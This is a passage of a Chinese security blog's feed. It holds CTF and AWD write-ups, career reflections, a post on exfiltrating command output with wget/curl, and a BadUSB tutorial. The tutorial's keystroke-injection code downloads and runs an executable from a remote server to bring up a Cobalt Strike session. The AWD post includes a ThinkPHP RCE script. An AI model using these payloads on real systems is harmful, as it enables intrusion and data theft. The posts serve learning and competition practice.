class="line"></span><br><span class="line">RAR Archive (rar)，                    文件头：52617221</span><br><span class="line">Wave (wav)，                            文件头：57415645</span><br><span class="line">AVI (avi)，                                 文件头：41564920</span><br><span class="line">Real Audio (ram)，                     文件头：2E7261FD</span><br><span class="line">Real Media (rm)，                       文件头：2E524D46</span><br><span class="line">MPEG (mpg)，                           文件头：000001BA</span><br><span class="line">MPEG (mpg)，                           文件头：000001B3</span><br><span class="line">Quicktime (mov)，                     文件头：6D6F6F76</span><br><span class="line">Windows Media (asf)，               文件头：3026B2758E66CF11</span><br><span class="line">MIDI (mid)，                              文件头：4D546864</span><br></pre></td></tr></table></figure><p>image-20210512132636816.png<img src="http://cdn.polowong.top/1620813669182k7qlq11e.png?imageslim" alt="paste image"></p><p>提取rar</p><p>image-20210512132807911.png<img src="http://cdn.polowong.top/16208136734786pvpwoic.png?imageslim" alt="paste image"></p><p>十六进制转ascii</p><p>flag{My_Name_is_AoBai}</p><h1 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h1><p>zip文件头修复</p><p>得到密文5a6e4665536e506248206579666b7b39733930733833742d393637312d3433626a2d616f69302d3235663176393138707030377d</p><p>十六进制转ascii</p><p>ZnFeSnPbH<br>eyfk{9s90s83t-9671-43bj-aoi0-25f1v918pp07}</p><p>维吉尼亚解密（captfencoder1.x版本 维吉尼亚解密有bug）</p><p>flag{9a90f83e-9671-43ac-bbd0-25b1d918ca07}</p><h1 id="misc-3"><a href="#misc-3" class="headerlink" title="misc 3"></a>misc 3</h1><p>压缩包头部修复，修改错了的1位</p><p>然后需要密码，直接binwalk分离出来一个Linux可执行文件，到这里卡住了。。然后后面看了看文件头应该是个png，zhiweilai加上png的为文件头后发现图片宽高有问题，Linux打不开，用脚本爆破宽高修改即可。</p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">filename = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    all_b = f.read()</span><br><span class="line">    crc32key = <span class="built_in">int</span>(all_b[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">    data = <span class="built_in">bytearray</span>(all_b[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">    n = <span class="number">4095</span>            <span class="comment">#理论上0xffffffff,但考虑到屏幕实际/cpu，0x0fff就差不多了</span></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):          <span class="comment">#高和宽一起爆破</span></span><br><span class="line">        width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))     <span class="comment">#q为8字节，i为4字节，h为2字节</span></span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">                data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">            crc32result = zlib.crc32(data)</span><br><span class="line">            <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;宽为：&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                width1=binascii.b2a_hex(width)</span><br><span class="line">                width1=width1.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                width1=<span class="built_in">int</span>(width1,<span class="number">16</span>)</span><br><span class="line">                <span class="built_in">print</span>(width,width1)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;高为：&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                height1=binascii.b2a_hex(height)</span><br><span class="line">                height1=height1.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                height1=<span class="built_in">int</span>(height1,<span class="number">16</span>)</span><br><span class="line">                <span class="built_in">print</span>(height,height1)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>在对应的位置修改图片宽高的十六进制值即可。</p><p>image-20210512175308222.png<img src="http://cdn.polowong.top/16208136581593aoz2hnd.png?imageslim" alt="paste image"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web1&quot;&gt;&lt;a href=&quot;#web1&quot; class=&quot;headerlink&quot; title=&quot;web1&quot;&gt;&lt;/a&gt;web1&lt;/h1&gt;&lt;p&gt;webshell上传&lt;/p&gt;
&lt;p&gt;前端绕过。绕了半天才想起来是前端绕过。。burp改个后缀就好了&lt;/p&gt;
&lt;figure </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>实习&amp;季度总结</title>
    <link href="https://polosec.github.io/2021/04/23/%E5%AE%9E%E4%B9%A0-%E5%AD%A3%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <id>https://polosec.github.io/2021/04/23/%E5%AE%9E%E4%B9%A0-%E5%AD%A3%E5%BA%A6%E6%80%BB%E7%BB%93/</id>
    <published>2021-04-23T07:17:00.000Z</published>
    <updated>2021-04-30T03:43:43.747Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>今天是2021年4月29日，刚结束某市hw项目，做完这个项目，我的实习生活基本算是结束了。还在高铁上，趁着这个时间总结下这四个月的实习&amp;项目生活。</p></blockquote><h2 id="金山云实习"><a href="#金山云实习" class="headerlink" title="金山云实习"></a>金山云实习</h2><p>今年一月份，开始了在金山云实习的日子，总计约三个月，其实干活的时间也就四十来天，中间算上过年、请假什么的，所以日子就比较少了。和同事们的相处很愉快，领导是搞技术的，相处起来非常舒服。在金山的这段时间还算是比较快乐的，虽然累了一点，但是收获相对还不错。在金山，首先是在做项目的过程中学到了一些知识，渗透的思路、测试方法啥的，我觉得这些比较重要，其次是在公司钓鱼的项目中学到了红队知识，并且开启了我对红队向往的大门。<br>在公司，我学到了一些简单的免杀技巧，并且还会继续钻研；接触到了钓鱼邮件伪造，目前还在学习；Badusb上线CS马，这个已经实现了。还有就是基本的应急响应技能，在公司我独立处理了一起应急响应事件，我觉得真的是很棒的实践机会。最后是社交方面，认识了一些朋友。其他虚无缥缈的不说了，只说些实际的。</p><h2 id="hw蓝队"><a href="#hw蓝队" class="headerlink" title="hw蓝队"></a>hw蓝队</h2><p>今年hw去了青藤，本来签了深蓝，深蓝的负责人对我也很好，但是后面出了点事情，所以我就给鸽了…不管怎么说，感谢硕哥给我机会，弟弟铭记在心。说实在的，hw我是夜班，主要是看HIDS设备告警，被地方的给搞烦了，经常有误报，白天的同时也很辛苦，我觉得我夜班还是非常幸运的，就是身体上累了点。我觉得 通过这次hw 认识朋友比较重要吧，其次就是真真正正地接触了一下这种大型的安全项目，之前并没有接触过。还有就是在hw时的一些处理事情的方法，比如处置流程、权限与职责。之类的之前也只是限于理论，也更加了解了我想象中的hw和真实的hw的区别2333.</p><h2 id="hw红队"><a href="#hw红队" class="headerlink" title="hw红队"></a>hw红队</h2><p>最后打了一次县市级的hw红队，其实还是挺丢人的，我自己知道自己水平不行，但是还是想去试试。虽然朋友跟我讲了是无责的，但是打了那么烂的成绩，自己心里真的不好受。。相比于拿到工资，更多的是自责吧。当然了，在这次的红队之旅中也学到了一些东西。首先是自己的渗透思路问题，渗透思路首先是不清晰，其次是太窄。信息收集时经常有遗漏或者对这个站做了某方法的收集，到了下个站就忘了或者不想做了。。这个毛病不知道什么时候能改掉。其次是漏洞的原理掌握的不够好和漏洞类型掌握的不够多，绕waf等操作需要较强的基础性知识。就像ssti绕过一样~不管怎么说，红队来了这一趟我个人是不亏的，但是对不起朋友了。</p><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>希望下次看到这篇博客，能对比写时有些进步。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;今天是2021年4月29日，刚结束某市hw项目，做完这个项目，我的实习生活基本算是结束了。还在高铁上，趁着这个时间总结下这四个月的实习&amp;amp;项目生活。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;金山云实习&quot;&gt;&lt;a href=&quot;#金山云</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>命令执行结果外带</title>
    <link href="https://polosec.github.io/2021/04/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%A4%96%E5%B8%A6/"/>
    <id>https://polosec.github.io/2021/04/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%A4%96%E5%B8%A6/</id>
    <published>2021-04-17T18:25:55.000Z</published>
    <updated>2021-04-17T21:37:56.341Z</updated>
    
    <content type="html"><![CDATA[<p>wget –header=”test:$(whoami)” <a href="http://ssti.com:5000/?username%5C=1">http://ssti.com:5000\?username\=1</a></p><img src="http://cdn.polowong.top/static/images/wget1.png"><p>whoami | curl -F “:data=@-“ <a href="http://ssti.com:5000/?username%5C=1">http://ssti.com:5000\?username\=1</a>  </p><img src="http://cdn.polowong.top/static/images/curl1.png"><p>Curl “<a href="http://ssti.com:5000/?username=&#96;whoami&#96;&quot;">http://ssti.com:5000?username=&#96;whoami&#96;&quot;</a></p><img src="http://cdn.polowong.top/static/images/curl2.png">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;wget –header=”test:$(whoami)” &lt;a href=&quot;http://ssti.com:5000/?username%5C=1&quot;&gt;http://ssti.com:5000\?username\=1&lt;/a&gt;&lt;/p&gt;
&lt;img src=&quot;http://cd</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>badusb踩坑&amp;近期感想</title>
    <link href="https://polosec.github.io/2021/03/29/badusb%E8%B8%A9%E5%9D%91-%E8%BF%91%E6%9C%9F%E6%84%9F%E6%83%B3/"/>
    <id>https://polosec.github.io/2021/03/29/badusb%E8%B8%A9%E5%9D%91-%E8%BF%91%E6%9C%9F%E6%84%9F%E6%83%B3/</id>
    <published>2021-03-29T12:34:48.000Z</published>
    <updated>2021-11-04T04:22:37.815Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前言：</p><p>近期在公司内部学了一点红队技能，虽然目前用不上，但是做个记录，顺便发牢骚。</p></blockquote><h1 id="致谢-amp-参考"><a href="#致谢-amp-参考" class="headerlink" title="致谢&amp;参考"></a>致谢&amp;参考</h1><p><a href="https://www.freebuf.com/articles/system/261020.html">https://www.freebuf.com/articles/system/261020.html</a></p><p><a href="https://blog.csdn.net/sxhexin/article/details/87914649">https://blog.csdn.net/sxhexin/article/details/87914649</a></p><p><a href="https://www.anquanke.com/post/id/227477">https://www.anquanke.com/post/id/227477</a></p><p><a href="https://www.freebuf.com/articles/system/261020.html">https://www.freebuf.com/articles/system/261020.html</a></p><h1 id="Badusb-插入上线cobalt-strike"><a href="#Badusb-插入上线cobalt-strike" class="headerlink" title="Badusb 插入上线cobalt strike"></a>Badusb 插入上线cobalt strike</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>ATtiny85 开发板、arduino IDE下载<a href="https://www.arduino.cc/en/Main/Softwaredigispark%E3%80%82%E6%9A%82%E6%97%B6%E5%85%88%E4%B8%8D%E8%A6%81%E8%A3%85%E9%A9%B1%E5%8A%A8%EF%BC%81%EF%BC%81%E9%A9%B1%E5%8A%A8%E6%9C%89%E5%A4%A7%E5%9D%91%E3%80%82">https://www.arduino.cc/en/Main/Softwaredigispark。暂时先不要装驱动！！驱动有大坑。</a></p><p>看freeebuf里面的教程装完驱动，烧录完只能执行一次，需要更新下固件才可以重复使用，后面会提到。</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>打开IDE,在文件-&gt;首选项中加入附加开发板管理，附加开发板管理网址处写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;digistump.com&#x2F;package_digistump_index.json</span><br></pre></td></tr></table></figure><p>注意，这里需要翻墙，后面添加开发板下载相关配置时也需要翻墙，现在就翻着 别断了。</p><h2 id="添加开发板"><a href="#添加开发板" class="headerlink" title="添加开发板"></a>添加开发板</h2><p>IDE中-工具-开发板管理，类型-contributed/贡献，选择</p><img src="http://cdn.polowong.top/static/images/boards.png"><p>然后选安装（翻墙）</p><p>安装好后，选择这个16.5mhz的开发板。</p><img src="http://cdn.polowong.top/static/images/1655.png"><h2 id="更新-boot-loader"><a href="#更新-boot-loader" class="headerlink" title="更新 boot loader"></a>更新 boot loader</h2><p>更新 BootLoader的教程看 <a href="https://blog.csdn.net/sxhexin/article/details/87914649%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B8%8D%E5%86%8D%E8%B5%98%E8%BF%B0%EF%BC%8C%E8%B7%9F%E7%9D%80%E8%BF%99%E4%B8%AA%E6%95%99%E7%A8%8B%E8%B5%B0%E6%B2%A1%E9%97%AE%E9%A2%98%E7%9A%84%EF%BC%8C%E5%A6%82%E6%9E%9C%E4%BD%A0%E4%B9%8B%E5%89%8D%E6%9C%89%E8%A3%85%E7%9B%B8%E5%85%B3%E9%A9%B1%E5%8A%A8%EF%BC%8C%E8%AF%B7%E6%8A%8A%E9%A9%B1%E5%8A%A8%E5%8D%B8%E8%BD%BD%E5%B9%B2%E5%87%80%EF%BC%81%EF%BC%81%EF%BC%81">https://blog.csdn.net/sxhexin/article/details/87914649，这里不再赘述，跟着这个教程走没问题的，如果你之前有装相关驱动，请把驱动卸载干净！！！</a></p><p>更新BootLoader是因为避免踩烧录完只能运行一次的坑！！</p><p>BootLoader是大坑，一定要好好弄！</p><h2 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h2><p>有兴趣一步步走的可以写个测试代码 cmd弹个窗什么的，我这里一步到位，直接远程加载exe。</p><p>对于cs 可以生成powershell，然后cmd里面powershell加载调用直接上线。</p><h2 id="使用CMD远程下载可执行文件"><a href="#使用CMD远程下载可执行文件" class="headerlink" title="使用CMD远程下载可执行文件"></a>使用CMD远程下载可执行文件</h2><p>我选择用cmd的原因是因为 我还不会powershell免杀（2333）</p><p>所以 探索了下 如何类似Linux执行多条命令，发现在Windows cmd下是and符号&amp;。</p><p>执行命令的代码框架如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;DigiKeyboard.h&quot;</span><span class="comment">//库文件</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// setup函数只运行一次</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">2000</span>);<span class="comment">//等待两秒，给电脑自动加载配置时间</span></span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);<span class="comment">//摁住WIN键</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);<span class="comment">//等待300毫秒</span></span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;cmd&quot;</span>);<span class="comment">//输入CMD</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;curl http://12xxxx0/calc.exe &gt; E:\\calc.exe &amp; E:\\calc.exe&quot;</span>);<span class="comment">//执行PAYLOAD，双引号需要斜杠转义</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，在最后一个注释处，是在前面语句打开cmd黑框的情况下，在cmd中输入的语句。两个反斜杠是为了转义。</p><p>我的思路是，将可执行exe文件上传至服务器，通过curl的方式下载并重定向至某个驱动器并执行。</p><p>我本来想放到C盘，但是放到C盘，有可能存在权限问题（放在C:\Windows\Temp）目录下也有些问题，于是放到了D/E盘。</p><p>将上述代码在IDE中输入后ctrl+u上传，然后插入attiny85 </p><img src="http://cdn.polowong.top/static/images/in1.png"><p>一定是先拔出来，出现这个 60seconds的时候插进去，出现下面这一串代表写入成功 并且会自动执行一次。</p><p>然后拔出来 再插进去的时候 就有弹计算器的效果了。（小思考，如何在执行完exe后自动关闭cmd黑框？）</p><p>效果如下：</p><img src="http://cdn.polowong.top/static/images/反弹.gif"><h2 id="CMD上线CS"><a href="#CMD上线CS" class="headerlink" title="CMD上线CS"></a>CMD上线CS</h2><p>嫖来了大佬的免杀方法2333 试一下exe上线cs</p><img src="http://cdn.polowong.top/static/images/cs.gif"><p>小思考的答案是：命令后跟&amp; exit;</p><p>23333 </p><h1 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h1><p><img src="http://cdn.polowong.top/1635999756597dkayi5vd.png?imageslim" alt="paste image"><br>5pyA6L+R5LiN5pivaHfkuYjvvIzorqTor4bkuIDkuKrlhazlj7jnmoRocuWnkOWnkO+8jOacgOi/keS5n+WcqGh35oub5Lq677yM6ZyA6KaB5LiA5Lqb5pyJ5omL5bCx6KGM55qE5bKX5L2N77yM5a+55rKh5Y67aHfov4cg5bm25LiU5oqA5pyv5LiN5oCO5LmI5qC355qE5ZCM5a2m5p2l6K+077yMNDAw5LiA5aSp55qE5b6F6YGH44CB5YyF5ZCD5L2P44CB5LiN6ZyA6KaB6Ieq5bex5Z6r6ZKx44CB6aG555uu546w5Zy65pyJ5Lq65bim77yM5oiR6KeJ5b6X5bey57uP5b6I5aW95ZWm44CC5aaC5p6c5oiR5aSn5LqM55qE5pe25YCZ5pyJ6L+Z56eN5py65Lya77yM5ZOq5oCV5LiN57uZ5oiR5bel6LWE77yM5oiR5Lmf6KaB5Y6744CC5oiR5L2c5Li65LiA5Liq5a2m55Sf77yM6Zmk5LqG5aSW5Ye66Ieq5bex5o6l6aG555uu77yM5a6e5Zyo5piv5oOz5LiN5Yiw6L+Y5pyJ5LuA5LmI5q+UaHfmm7Tlpb3nmoTog73nm7jlr7nku47nroDljZXlvIDlp4vmjqXop6blronlhajlrp7miJjnmoTlnLrmma/kuobjgILvvIhTUkPkuI3nrpfvvIxTUkPkuZ/pnIDopoHnm7jlvZPnmoTlronlhajln7rnoYDjgILvvInmiJHmiorov5nkuKrmtLvmjqjov4fljrvkuYvlkI7vvIzkuInkuKrluIjlvJ/kuZ/lvojnu5nlipvvvIzpgJrov4fkuobpnaLor5XjgILlj6/kuIfkuIfmsqHmg7PliLDor7flgYfnmoTml7blgJnlh7rpl67popjkuobvvIzlr7zlkZjor7TnjrDlnKjnmoTph43lv4PlupTor6XmmK/kuJPkuJror77lrabkuaDjgIHogIzkuI3mmK/mg7PnnYDlh7rljrvlrp7kuaDvvIzlubbkuJTmi7/miJHkuL7kvovlrZAyMzMz44CC5pyA5ZCO6L+Y6K+077yM5Y+q6KaB5L2g5Y675LqG5bCx57uZ5L2g6YCA5a2m77yM55yf5LiN5oiz44CC54S26ICM5pu05Y+v56yR55qE5piv77yM5p+Q6ICB5biI5ZyoMTfnuqfpgJrnn6XnvqTlj5Hkuoblj6bkuIDlrrbmnLrmnoTnmoRod+Wuo+S8oO+8jOW+hemBh+aIkeS5n+ivtOS4i++8jDMwMC00MDDkuIDlpKnvvIzkuI3ljIXlkIPkvY/vvIzmnInlhY3otLnln7norq3vvIzmoLnmja7ln7norq3ogIPmoLjnu5PmnpzliIbnuqLok53pmJ/vvIjvvJ/vvInvvIznhLblkI7miJHmiZPnlLXor53ov4fljrvpl67kuobkuIvvvIzmu6HlmLTot5/miJHosIjnkIbmg7PosIjpgZPlvrfosIjmioDmnK/jgIHlsLHor7TlrabnlJ/kuI3opoHogIHmg7PnnYDmjKPpkrHkupHkupHjgILmiJHkvLDorqEg5LiN57uZ5oiR6L+Z5LiJ5Liq5biI5byf5YGH55qE5Y6f5Zug77yM5bqU6K+l5piv5Yqo5LqG5LuW5Lus55qE6JuL57OV5LqG5ZCn77yM5LuO6YKj6L656LWw6IO95oq96ZKxMjMzM+OAguWtpumZouWvueaIkeW+iOWlveOAgeWQhOS9jemihuWvvOiAgeW4iOWSjOiUvOWPr+S6su+8jOWtpumZouS5n+e7meS6huaIkeaOqOWFjeWQjemine+8jOmhuuWIqeaOqOWFjeiHs1VFU1RD44CC5b+D5oCA5oSf5oGp5LmL5b+D77yM5oOz5o6o5biI5byf5LiA5oqK77yM5Y67aHfvvIzmsqHmg7PliLDnq5/nhLbkuI3nu5nlh4blgYfvvIznnJ/nmoTvvIzlv4Pph4zpnaLlh4nkuoblvojlpJrjgILkuI3or7TkuoZ+57un57ut5YaZ5q+V5Lia6K665paH5LqGfg==</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;前言：&lt;/p&gt;
&lt;p&gt;近期在公司内部学了一点红队技能，虽然目前用不上，但是做个记录，顺便发牢骚。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;致谢-amp-参考&quot;&gt;&lt;a href=&quot;#致谢-amp-参考&quot; class=&quot;headerlink</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>近一年学习总结</title>
    <link href="https://polosec.github.io/2021/03/06/%E8%BF%91%E4%B8%80%E5%B9%B4%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <id>https://polosec.github.io/2021/03/06/%E8%BF%91%E4%B8%80%E5%B9%B4%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</id>
    <published>2021-03-06T08:56:06.000Z</published>
    <updated>2021-03-06T09:10:50.739Z</updated>
    
    <content type="html"><![CDATA[<p>虽然接触安全从初中就算开始了，但当时也仅仅是停留于混混娱乐圈，日一日别人的webshell。</p><p>大一大二对安全知识的学习较少，大二外出打了两次比赛，成绩较差，直接白给。</p><p>大三寒假疫情在家的时候算是正式开始学习安全知识，做最简单的靶场，刷题，前两次正经打的比赛是I春秋高校抗疫和BJDCTF。</p><p>这是一个纠结的过程，因为在那个阶段我还要准备保研，还在保研和考研两者之间摇摆。</p><p>最终下定决心冲一冲，那是三月底。某公众号预测我保研成功率在30%左右。</p><p>具体学什么知识在这里也不想说了，算是从最基础的开始学习吧，印象比较深的是LFI。现在我XSS和注入玩的也不好，算是只会用工具跑跑。</p><p>保完研之后有些许松懈，对安全知识的学习有些懈怠了，SRC还没开始搞，到现在上班时间也不太充裕。</p><p>现在正好是三月初，距离我开始正式接触安全也差不多一年的时间，在这一年里，我做到了：</p><p>1.两份渗透岗实习经历</p><p>2.两次通过护网面试，一次中级，一次初级。（蓝队</p><p>3.拿到五所985网络安全专业OFFER,其中四个学硕;</p><p>4.数次参加线上赛，虽然白给的较多</p><p>5.两次带队参加省赛</p><p>6.开始打AWD</p><p>7.独立发表一篇论文</p><p>8.独立完成两个小项目</p><p>9.美赛建模一等奖</p><p>10.自费MacBook Pro</p><p>11.经济独立</p><p>12.顺利保研</p><p>下一年渴望更健康的身体与相对坚强的意志，至少不能中午一觉睡三个小时。</p><p>仅此记录</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;虽然接触安全从初中就算开始了，但当时也仅仅是停留于混混娱乐圈，日一日别人的webshell。&lt;/p&gt;
&lt;p&gt;大一大二对安全知识的学习较少，大二外出打了两次比赛，成绩较差，直接白给。&lt;/p&gt;
&lt;p&gt;大三寒假疫情在家的时候算是正式开始学习安全知识，做最简单的靶场，刷题，前两次正</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>记一次线上AWD</title>
    <link href="https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/"/>
    <id>https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/</id>
    <published>2021-02-24T16:24:25.000Z</published>
    <updated>2021-02-24T16:52:22.848Z</updated>
    
    <content type="html"><![CDATA[<p>最近打了一次线上AWD，算是第一次正式打AWD,表现不太好，前期看了一些AWD的思路和套路，但是没有真正应用于实际的AWD环境中，随做一次记录，记录这里面存在的问题以及没做好的地方。</p><h1 id="开赛"><a href="#开赛" class="headerlink" title="开赛"></a>开赛</h1><p>开局给了ssh和web服务以及要求，如果被check down了，每轮扣100分（当时不知道每轮扣100分，以为一共扣100，每次restart需要扣100并且重置环境，所以就一直没restart）</p><h1 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h1><p>拿到ssh权限后首先备份了文件，用D盾、河马webshell专杀工具对web环境进行杀毒，想查杀webshell。</p><p>在webshell查杀环节中，使用河马webshell专杀工具和D盾杀了一个shell，但是有免杀shell没杀出来（一般AWD会内置多个后门），由于时间原因也没有细看，造成的后果是被传了不死马。（这是后话了。</p><p>在webshell查杀环节中应改进的地方是：</p><p>1.采用多种工具综合查杀webshell</p><p>2.对疑似后门文件手工查看，不能完全相信工具。</p><h3 id="弱点1"><a href="#弱点1" class="headerlink" title="弱点1"></a>弱点1</h3><p>流量监控脚本没挂上去，导致监控流量失败，无法得知有哪些payload是发起了攻击。</p><h2 id="自检"><a href="#自检" class="headerlink" title="自检"></a>自检</h2><p>通过观察web服务以及报错页面，出现了经典的十年磨一剑—-TP5.0.2，于是立刻想到了TP5.0.2的RCE。</p><p>网上收集payload后打了一波cat/flag，成功，并且通过该方式拿到了其他队伍的flag，遂考虑采用脚本编写EXP批量getflag并通知负责防护的队员修复相关漏洞。</p><h3 id="弱点2"><a href="#弱点2" class="headerlink" title="弱点2"></a>弱点2</h3><p>在修复时浪费了太多的时间，负责修复的队员无法尽快修复，并在上传修复后的文件时遇到了权限问题。</p><h3 id="弱点3"><a href="#弱点3" class="headerlink" title="弱点3"></a>弱点3</h3><p>临场紧张+payload不熟悉</p><p>我真的吐了。当时太紧张了，之前利用TP5的payload也是复制粘贴，这两个因素加起来导致我在Hackbar能顺利打payload，Burp也可以，但到了写脚本的时候就不行。因为payload是四个键值对，我写脚本的时候只写了一个。</p><p>贴一下我当时写的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests,json</span><br><span class="line">url=<span class="string">&quot;http://47.104.144.188:&quot;</span></span><br><span class="line">rest=<span class="string">&quot;/index.php?s=captcha&quot;</span></span><br><span class="line">data=&#123;<span class="string">&#x27; _method&#x27;</span>:<span class="string">&#x27;__construct&amp;filter%5B%5D=system&amp;get%5B%5D=cat+%2Fflag&amp;method=get&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9001</span>,<span class="number">9051</span>):</span><br><span class="line">    urls=<span class="built_in">str</span>(url+<span class="built_in">str</span>(port)+rest)</span><br><span class="line">    response=requests.post(url=urls,data=data)</span><br><span class="line">    <span class="built_in">print</span> (response.text)</span><br></pre></td></tr></table></figure><h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><p>在拿到一个并且唯一一个payload后，由于没有编写出批量利用脚本，遂考虑手动打，导致的得分缓慢。</p><h3 id="弱点4"><a href="#弱点4" class="headerlink" title="弱点4"></a>弱点4</h3><p>临场脚本编写能力欠缺</p><p>在编写脚本的过程中，需要用到对html标签解析的库（叫啥忘了）、多线程（批量getflag和提交flag），但由于很久没写多线程了，所以忘了多线程咋用了。。而且解析html标签还是大二学爬虫的时候写的，太过久远，也搞忘记了。所以最后脚本也没跑起来，耽误了太多时间。</p><h3 id="弱点5"><a href="#弱点5" class="headerlink" title="弱点5"></a>弱点5</h3><p>对AWD赛制不熟悉，机器至少down了三分之一的比赛时间，5分钟一轮，一轮掉100分。我说怎么越交flag分越少。。绝了。</p><h1 id="反思与改进"><a href="#反思与改进" class="headerlink" title="反思与改进"></a>反思与改进</h1><h2 id="提升脚本编写能力"><a href="#提升脚本编写能力" class="headerlink" title="提升脚本编写能力"></a>提升脚本编写能力</h2><p>不说了。多写多看多寻思 多借鉴别人的思路，掌握基本库的用法。</p><p><strong>先把多线程和xpath解析学会了！！！</strong></p><h2 id="提升payload熟练度"><a href="#提升payload熟练度" 